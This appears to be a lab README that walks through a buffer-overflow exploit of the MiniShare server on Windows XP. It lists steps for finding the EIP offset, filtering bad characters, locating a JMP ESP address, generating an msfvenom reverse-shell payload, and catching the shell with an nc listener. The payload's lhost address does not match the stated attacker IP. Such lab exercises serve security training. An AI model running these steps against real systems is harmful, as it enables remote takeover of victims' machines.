# buffer_overflow_winXP

The Guideline for Buffer Overflow Attack 
Kali Linux: attacker (192.168.230.153) | Windows XP: victim (192.168.230.170)
--------------------------------------------------------------------------------------------------
-Step1: (Windows), open Minishare, Immunity Debugger/Attach/Minishare
(if needed Immunity Debugger/Debug/Restart (Yes), /Play)

-Step2: (Kali), python mini-1.py 192.168.230.170
check: EIP 41414141

-Step3: (Kali, generate pattern for checking offset value of ESP) 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
Copy the pattern to mini-2.py

-Step4: Immunity Debugger/Debug/Restart (Yes), /Play
python mini-2.py 192.168.230.170
check: ESP Ch7Ch8Ch9 ...
check: EIP 36684335

-Step5: (Kali, check the offset)
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 36684335
Exact match at offset 1787
Edit mini-3.py

-Step6: Immunity Debugger/Debug/Restart (Yes), /Play
python mini-3.py 192.168.230.170
Check: ESP "CCC ...
Check: EIP 42424242
Add badchars to mini-4.py

-Step7: Immunity Debugger/Debug/Restart (Yes), /Play
python mini-4.py 192.168.230.170
Click ESP, right click/ Follow in Dump, check Hex Dump: 01 02 03 ... 0C 0D 0E ...
Edit mini-5.py, remove the value \x0d

-Step8: Immunity Debugger/Debug/Restart (Yes), /Play
python mini-5.py 192.168.230.170
Click ESP, right click/Follow in Dump, check Hex Dump: don't see 0D

-Step9: Immunity Debugger/Debug/Restart (Yes)
/View/log, click USER32.dll -> click "e" on the tool bar, double click USER32.dll/right click/Search for/Command: JMP ESP, remember the address value 7E429353 that is added value to mini-6.py

-Step10: (Kali, create a shellcode) msfvenom -p windows/shell_reverse_tcp lhost=192.168.37.128 lport=443 -b "\x00\x0d" -f c -e x86/shikata_ga_nai
Add the shellcode to mini-6.py, remove the badchars.

-Step11: (Kali) nc -lvp 443

-Step12: Exit Immunity Debugger. Open Minishare.
python mini-6.py 192.168.230.170
(Kali) At the terminal running nc -lvp 443 dumps the terminal of Windows XP (for example: C:\Documents and Settings\victim\Desktop\MiniShare>). Now, you can run commands for remote control.
                                                                                             
